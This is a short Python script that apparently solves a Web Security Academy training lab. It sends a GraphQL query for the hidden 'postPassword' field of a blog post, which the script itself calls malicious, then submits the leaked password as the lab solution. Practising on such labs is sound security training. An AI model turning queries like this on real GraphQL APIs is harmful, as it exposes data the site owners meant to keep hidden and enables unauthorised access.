import requests
import sys

TARGET_URL = "https://0a7400ee03f7a6eb826eba5600c60008.web-security-academy.net"
GRAPHQL_URL = f"{TARGET_URL}/graphql/v1"
SUBMIT_URL = f"{TARGET_URL}/submitSolution"

def solve_lab():
    print("Sending malicious GraphQL query...")
    
    query = """
    query getBlogPost($id: Int!) {
        getBlogPost(id: $id) {
            postPassword
        }
    }
    """
    
    variables = {
        "id": 3
    }
    
    payload = {
        "query": query,
        "variables": variables
    }
    
    try:
        response = requests.post(GRAPHQL_URL, json=payload)
        
        if response.status_code == 200:
            data = response.json()
            if "data" in data and "getBlogPost" in data["data"]:
                password = data["data"]["getBlogPost"]["postPassword"]
                print(f"Hidden Password Found: {password}")
                
                print("Submitting solution...")
                submit_resp = requests.post(SUBMIT_URL, data={"solution": password})
                
                if "true" in submit_resp.text or submit_resp.status_code == 200:
                    print("Lab Solved Successfully.")
                else:
                    print("Submission failed.")
            else:
                print("Could not find postPassword in response.")
                print(data)
        else:
            print(f"Request failed with status: {response.status_code}")
            
    except Exception as e:
        print(e)

if __name__ == "__main__":
    solve_lab()